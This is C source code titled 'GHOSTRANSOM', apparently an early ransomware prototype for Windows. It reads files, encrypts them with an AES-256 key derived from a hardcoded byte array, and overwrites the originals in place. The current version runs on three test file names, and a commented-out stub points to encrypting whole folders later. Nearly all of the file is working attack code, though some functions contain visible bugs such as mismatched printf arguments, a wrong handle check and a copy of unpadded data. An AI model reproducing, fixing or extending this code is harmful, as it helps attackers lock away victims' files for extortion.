/*GHOSTRANSOM*/

#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>

#define ERROR "[-]"
#define SUCCESS "[+]"
#define INFO "[>]"

char key[] = {
        0x61, 0x62, 0x6b, 0x65, 0x6c, 0x64, 0x6c, 0x77, 0x68, 0x73, 0x6b, 0x64, 0x6c, 0x66, 0x3b, 0x64
};

unsigned char* code;

unsigned char* LoadFile(LPCSTR* lFileName, long* file_size) {
    HANDLE hFile = NULL;

    char* lFileContent = NULL;

    hFile = CreateFileA(lFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL) {
        printf("%s CreateFile failed with error: 0x%x\n", ERROR, GetLastError());
    }

    DWORD bytesRead = 0;

    *file_size = GetFileSize(hFile, NULL);
    if (file_size == NULL) {
        printf("%s GetFileSize failed with error: 0x%x\n", ERROR, GetLastError());
        return 1;
    }
    printf("%s FileSize is : %d\n", INFO, *file_size);

    lFileContent = (char*)malloc(*file_size);
    if (lFileContent == NULL) {
        printf("Memory allocation for load file failed with error: 0x%x\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    if (!ReadFile(hFile, lFileContent, *file_size, &bytesRead, NULL)) {
        printf("ReadFile failed with error: 0x%x\n");
        return 1;
    }

    CloseHandle(hFile);

    return lFileContent;
}

BOOL WriteToFile(LPCSTR* lFileName, unsigned char* encrypted_code, long* file_size) {
    HANDLE hEncryptedFile = NULL;

    printf("%s filename: %s\n", INFO, lFileName);
    hEncryptedFile = CreateFileA(lFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hEncryptedFile == INVALID_HANDLE_VALUE) {
        printf("%s CreateFile failed with error: 0x%x\n", ERROR);
    }

    DWORD bytesWritten;
    printf("%s filesize: %d\n", INFO, file_size);
    if (!WriteFile(hEncryptedFile, encrypted_code, file_size, &bytesWritten, NULL)) {
        printf("WriteFile failed with error: 0x%x\n");
        return 1;
    }
}

unsigned char* PadData(unsigned char* data, DWORD* data_len) {
    DWORD pad_len = 16 - (*data_len % 16);
    if (pad_len == 16) pad_len = 0;

    *data_len += pad_len;
    unsigned char* padded_data = (unsigned char*)malloc(*data_len);
    if (padded_data == NULL) {
        printf("Memory allocation for padding failed with error: 0x%x\n", ERROR, GetLastError());
        exit(1);
    }

    memcpy(padded_data, data, *data_len - pad_len);

    memset(padded_data + (*data_len - pad_len), pad_len, pad_len);

    return padded_data;
}

unsigned char* AesEncrypt(int nothing, char* code, int code_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("%s CryptAcquireContext failed with error: 0x%x\n", ERROR, GetLastError());
        exit(1);
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("%s CryptCreateHash failed with error: 0x%x\n", ERROR, GetLastError());
        exit(1);
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        printf("%s CryptHashData failed with error: 0x%x\n", ERROR, GetLastError());
        exit(1);
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("%s CryptDeriveKey failed with error: 0x%x\n", ERROR, GetLastError());
        exit(1);
    }

    unsigned char* padded_data = PadData((unsigned char*)code, (DWORD*)&code_len);

    DWORD encrypted_len = (DWORD)code_len;

    unsigned char* encrypted_code = (unsigned char*)malloc(encrypted_len);
    if (encrypted_code == NULL) {
        printf("%s Memory allocation FOR encrypted code failed with error: 0x%x\n", ERROR, GetLastError());
        exit(1);
    }

    memcpy(encrypted_code, code, code_len);

    if (!CryptEncrypt(hKey, (HCRYPTHASH)NULL, 0, 0, encrypted_code, &encrypted_len, encrypted_len)) {
        printf("%s CryptDecrypt failed with error 0x%x\n", ERROR, GetLastError());
        exit(1);
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    printf("%s Sucessfully encrypted the file\n", SUCCESS);

    return encrypted_code;
}

int main(int argc, char* argv[]) {
    //Specify the folder for encryption later
    //if (argc < 2) {
            //printf("%s %s <folder>\n", INFO, argv[0]);
    //}

    printf("%s Starting program...\n", SUCCESS);

    char* test[3] = { "test", "test2", "test3" };
    for (int i = 0; i < 3; i++) {

        unsigned int code_len;
        long file_size = NULL;

        LPCSTR* lFileName = test[i];
        code = LoadFile(lFileName, &file_size);

        code_len = file_size;

        unsigned char* encrypted_code = AesEncrypt(0, code, code_len, key, sizeof(key));
        if (encrypted_code == NULL) {
            printf("%s AesEncrypt failed with error: 0x%x\n", ERROR, GetLastError());
            return 1;
        }

        printf("%s Altering file...\n", INFO);

        if (!WriteToFile(lFileName, encrypted_code, file_size)) {
            printf("%s WriteFile failed with error: %s\n", ERROR, GetLastError());
        }
    }
    printf("%s Altered file successfully", SUCCESS);

    return 0;
}